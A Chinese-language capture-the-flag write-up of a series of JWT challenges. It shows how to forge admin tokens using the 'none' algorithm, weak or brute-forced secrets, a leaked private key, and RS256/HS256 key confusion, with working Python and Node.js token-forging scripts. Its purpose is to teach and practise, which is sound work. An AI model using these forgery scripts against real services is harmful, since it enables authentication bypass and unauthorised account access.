@[toc]

##  JWT的简介

[JWT简要介绍 ](https://www.scuctf.com/ctfwiki/web/7.jwt/jwt简要介绍/)

[JSON Web Token 入门教程](https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)

明确header,payload,signature三个东西的组成原理

明确jwt的作用和与session_id的区别所在。

base64URL的加密算法。

##  web354(无加密)

F12看到有个/admin的文件目录，进去之后访问不了

然后抓包发现一串cookie中的token，就是JWT

我们将

第一部分{"alg":"None","typ":"jwt"}base64编码后是eyJhbGciOiJOb25lIiwidHlwIjoiand0In0(去掉等号)
第二部分[{"sub":"admin"}]base64编码后是W3sic3ViIjoiYWRtaW4ifV0
所以把原来的jwt修改为eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3sic3ViIjoiYWRtaW4ifV0然后访问/admin/即可

这儿有个小知识

```
/admin，表示/admin.php
/admin/，表示admin下的文件目录
```

##  web346

签名算法被修改为none，从而实现任意的修改token

JWT如果将header中的alg设置为“None”,那么JWT中的内容没有加密，第三部分直接置空，所有的都可以访问，可以任意构造token来达到效果。

前面同样的操作，但是因为None，jwt.io不可以实现

我们用脚本

```python
import jwt

# payload
token_dict = {
  "iss": "admin",
  "iat": 1609236870,
  "exp": 1609244070,
  "nbf": 1609236870,
  "sub": "admin",
  "jti": "943d0b3237806659d2e205e42b319494"
}

headers = {
  "alg": "none",
  "typ": "JWT"
}
jwt_token = jwt.encode(token_dict,  # payload, 有效载体
                       "",  # 进行加密签名的密钥
                       algorithm="none",  # 指明签名算法方式, 默认也是HS256
                       headers=headers 
                       # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       )

print(jwt_token)

```

然后访问即可/admin/得到。

##   web347

弱口令密钥

听题目说是弱口令

将sub：user，改为sub：admin，绕过修改密钥为123456，即可得到token

访问/admin/，即可得到flag

##  web348

爆破密钥

使用爆破工具c-jwt-cracker

https://github.com/brendan-rius/c-jwt-cracker

爆破出来，得到密匙为aaab,其他跟上面的操作一样

##   web349

公私钥泄露

打开环境附件

```javascript
/* GET home page. */
router.get('/', function(req, res, next) {
  res.type('html');
  var privateKey = fs.readFileSync(process.cwd()+'//public//private.key');
  var token = jwt.sign({ user: 'user' }, privateKey, { algorithm: 'RS256' });
  res.cookie('auth',token);
  res.end('where is flag?');
  
});

router.post('/',function(req,res,next){
	var flag="flag_here";
	res.type('html');
	var auth = req.cookies.auth;
	var cert = fs.readFileSync(process.cwd()+'//public/public.key');  // get public key
	jwt.verify(auth, cert, function(err, decoded) {
	  if(decoded.user==='admin'){
	  	res.end(flag);
	  }else{
	  	res.end('you are not admin');
	  }
	});
});

```

发现可以通过url+/private.key和public.key得到公钥和私钥

然后将内容填入jwt.io，改admin，后面一样的

##  web350

密钥混淆攻击

该题是RS256和HS256的转换

关于RS的介绍

[密钥混淆攻击 - SCU-CTF HomePage (scuctf.com)](https://www.scuctf.com/ctfwiki/web/7.jwt/密钥混淆攻击/)

https://xz.aliyun.com/t/2338

nodejs运行exp

```js
const jwt = require('jsonwebtoken');
var fs = require('fs');
var privateKey = fs.readFileSync('public.key');
var token = jwt.sign({ user: 'admin' }, privateKey, { algorithm: 'HS256' });
console.log(token)

```

后面一样的

